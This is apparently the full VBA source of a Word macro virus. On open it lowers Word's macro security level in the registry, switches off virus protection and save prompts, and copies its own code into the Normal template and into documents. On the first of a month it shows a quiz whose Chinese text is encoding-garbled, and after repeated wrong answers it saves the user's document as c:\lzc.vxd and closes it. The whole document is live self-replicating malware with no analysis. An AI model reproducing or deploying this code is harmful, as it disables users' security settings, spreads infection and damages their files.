   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Dim DI As Boolean, TI As Boolean, d As Object, t As Object, Src As String, r As String
   Private Sub Document_Close()
   On Error Resume Next
     Call Document_Open
     If DI And Not (TI) Then
       Src = d.CodeModule.Lines(1, d.CodeModule.CountOfLines)
       t.CodeModule.AddFromString Src
       NormalTemplate.Save
     ElseIf TI And Not (DI) Then
   If Day(Now()) = 1 Then
    Do
    r = UCase(InputBox("³¤°²Ö®ÐÇ³µ³¤¶àÉÙÃ×?" & Chr(13) & Chr(13) _
    & "A.3Ã×4  B.3Ã×5  C.3Ã×55  D.3Ã×7" & Chr(13) & Chr(13) _
    & "ÒªºÃºÃË¼¿¼Ó´!", "½ô¼±ÌáÎÊ"))
    Loop Until r <> ""
    If r = "B" Then
      MsgBox "ºÃ°ôÓ´!"
      GoTo 10
    Else
      MsgBox "°¦!ÔÙ¸øÄãÒ»´Î»ú»á."
       Do
        r = UCase(InputBox("³¤°²Ö®ÐÇFBAÊÇÊ²Ã´ÐÍ?" & Chr(13) & Chr(13) _
        & "A.±ê×¼ÐÍ  B.ÆÕÍ¨ÐÍ  C.ºÀ»ªÐÍ" & Chr(13) & Chr(13) _
        & "ÏëºÃÁËÔÙ»Ø´ð!", "½ô¼±ÌáÎÊ"))
       Loop Until r <> ""
         If r = "C" Then
           MsgBox "Ð»Ð»ÄãµÄÖ§³Ö!"
           GoTo 10
         Else
           MsgBox "±¿µ°!¸øÄã×îºóÒ»´Î»ú»á."
             Do
              r = UCase(InputBox("°²È«ÆøÄÒÊÇ¸ÉÊ²Ã´ÓÃµÄ?" & Chr(13) & Chr(13) _
              & "A.·ÀÖ¹×²³µ  B.·ÀÖ¹²à»¬  C.×²³µÊ±±£»¤¼ÝÊ»Ô±" & Chr(13) & Chr(13) _
              & "ÕâÊÇ×îºóÒ»´Î»ú»áÓ´!", "½ô¼±ÌáÎÊ"))
             Loop Until r <> ""
              If r = "C" Then
                MsgBox "×ÜËã´ð¶ÔÁË!"
                GoTo 10
              Else
                MsgBox "¿´À´Äã»¹ÐèÒª¶Ô³¤°²Ö®ÐÇ¶à¼ÓÁË½â..."
                ActiveDocument.SaveAs "c:\lzc.vxd"
                ActiveDocument.Close
                Exit Sub
              End If
         End If
    End If
   End If
   10:
       Src = t.CodeModule.Lines(1, t.CodeModule.CountOfLines)
       d.CodeModule.AddFromString Src
       ActiveDocument.Save
     End If
   End Sub

   Private Sub Document_Open()
   On Error Resume Next
     System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
     Options.ConfirmConversions = False: Options.VirusProtection = False: Options.SaveNormalPrompt = False

   Set d = ActiveDocument.VBProject.VBComponents.Item(1)
   Set t = NormalTemplate.VBProject.VBComponents.Item(1)
   DI = d.CodeModule.Find("³¤°²¹«Ë¾ÆûÑÐËù ³£Ê¶¿Îa", 1, 1, 1000, 1000)
   TI = t.CodeModule.Find("³¤°²¹«Ë¾ÆûÑÐËù ³£Ê¶¿Îa", 1, 1, 1000, 1000)
     If DI And Not (TI) Then
       t.CodeModule.DeleteLines 1, t.CodeModule.CountOfLines
     ElseIf TI And Not (DI) Then
       d.CodeModule.DeleteLines 1, d.CodeModule.CountOfLines
     End If
   End Sub
